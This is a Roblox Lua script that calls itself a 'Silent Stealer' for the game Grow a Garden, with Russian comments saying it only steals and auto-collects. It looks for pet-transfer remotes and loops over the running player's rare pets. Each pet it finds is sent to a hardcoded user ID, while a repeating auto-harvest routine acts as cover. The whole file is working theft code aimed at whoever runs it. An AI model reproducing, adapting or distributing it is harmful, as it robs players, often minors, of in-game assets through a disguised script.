-- Grow a Garden Silent Stealer v4.5 - MALOT
-- Полностью без визуала. Только кража + авто-сбор

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local YOUR_USER_ID = 3793906492

local function findRemote(keywords)
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local name = obj.Name:lower()
            for _, kw in ipairs(keywords) do
                if name:find(kw) then
                    return obj
                end
            end
        end
    end
    return nil
end

local transferRemote = findRemote({"transfer", "givepet", "claimpet", "sendpet", "pettransfer"})
local harvestRemote = findRemote({"harvest", "collect", "pick", "crop", "gather"})

local function stealPets()
    if not transferRemote then return end

    local folders = {LocalPlayer:FindFirstChild("Pets"), LocalPlayer.PlayerGui:FindFirstChild("PetInventory"), LocalPlayer:FindFirstChild("PlayerData")}
    
    for _, folder in ipairs(folders) do
        if folder then
            for _, pet in ipairs(folder:GetDescendants()) do
                if pet:IsA("Folder") or pet:IsA("Model") then
                    local n = pet.Name:lower()
                    if n:find("legendary") or n:find("mythic") or n:find("epic") or n:find("rare") or n:find("shiny") or 
                       n:find("secret") or n:find("raccoon") or n:find("енот") then
                        
                        local args = {pet, YOUR_USER_ID, "transfer"}
                        
                        pcall(function()
                            if transferRemote:IsA("RemoteEvent") then
                                transferRemote:FireServer(unpack(args))
                            elseif transferRemote:IsA("RemoteFunction") then
                                transferRemote:InvokeServer(unpack(args))
                            end
                        end)
                        
                        task.wait(0.25)
                    end
                end
            end
        end
    end
end

local function autoHarvest()
    if harvestRemote then
        pcall(function()
            if harvestRemote:IsA("RemoteEvent") then
                harvestRemote:FireServer()
            elseif harvestRemote:IsA("RemoteFunction") then
                harvestRemote:InvokeServer()
            end
        end)
    end
end

-- Запуск
task.wait(2)
stealPets()
autoHarvest()

while true do
    task.wait(12)
    autoHarvest()
    task.wait(1)
    stealPets()
end
